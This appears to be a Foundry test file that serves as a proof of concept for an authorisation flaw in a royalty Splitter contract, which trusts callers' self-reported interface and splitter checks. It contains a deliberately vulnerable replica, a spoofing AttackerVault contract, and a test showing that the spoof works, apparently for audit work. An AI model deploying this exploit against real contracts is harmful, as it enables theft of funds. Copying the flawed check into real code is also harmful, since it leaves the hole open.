pragma solidity 0.8.20;

import "forge-std/Test.sol";

interface IERC20 { function balanceOf(address) external view returns (uint256); }
interface IRoyaltyVault { function supportsInterface(bytes4) external view returns (bool); function getSplitter() external view returns (address); }

// Minimal vulnerable replica (inline — do NOT import from ../src/)
contract Splitter {
    bytes4 public constant IID_IROYALTY = type(IRoyaltyVault).interfaceId;
    address public splitAsset;
    uint256[] public balanceForWindow;
    uint256 public currentWindow;

    constructor(address _splitAsset) { splitAsset = _splitAsset; }

    function incrementWindow(uint256 royaltyAmount) public returns (bool) {
        uint256 wethBalance;

        require(
            IRoyaltyVault(msg.sender).supportsInterface(IID_IROYALTY),
            "Royalty Vault not supported"
        );
        require(
            IRoyaltyVault(msg.sender).getSplitter() == address(this),
            "Unauthorised to increment window"
        );

        wethBalance = IERC20(splitAsset).balanceOf(address(this));
        require(wethBalance >= royaltyAmount, "Insufficient funds");

        require(royaltyAmount > 0, "No additional funds for window");
        balanceForWindow.push(royaltyAmount);
        currentWindow += 1;
        return true;
    }
}

// Simple token stub to give the Splitter a balance
contract DummyToken {
    mapping(address => uint256) public balances;
    function mint(address to, uint256 amt) external { balances[to] += amt; }
    function balanceOf(address who) external view returns (uint256) { return balances[who]; }
}

// Malicious vault that can spoof supportsInterface and getSplitter()
contract AttackerVault {
    address public splitter;
    constructor(address _splitter) { splitter = _splitter; }
    function supportsInterface(bytes4) external pure returns (bool) { return true; }
    function getSplitter() external view returns (address) { return splitter; }
    function attack(uint256 amt) external { Splitter(splitter).incrementWindow(amt); }
}

contract SplitterTest is Test {
    Splitter target;
    DummyToken token;
    AttackerVault vault;
    address attacker;

    function setUp() public {
        attacker = makeAddr("attacker");
        token = new DummyToken();
        target = new Splitter(address(token));
        // Fund the splitter so the balance checks pass
        token.mint(address(target), 1000);
        vault = new AttackerVault(address(target));
    }

    function test_attacker_exploits_incrementWindow() public {
        // Call attack from an EOA but the actual msg.sender seen by Splitter will be the vault contract
        vm.prank(attacker);
        vault.attack(500);

        // Attacker-controlled vault was able to increment the window despite no real auth
        assertEq(target.currentWindow(), 1);
        assertEq(target.balanceForWindow(0), 500);
    }
}
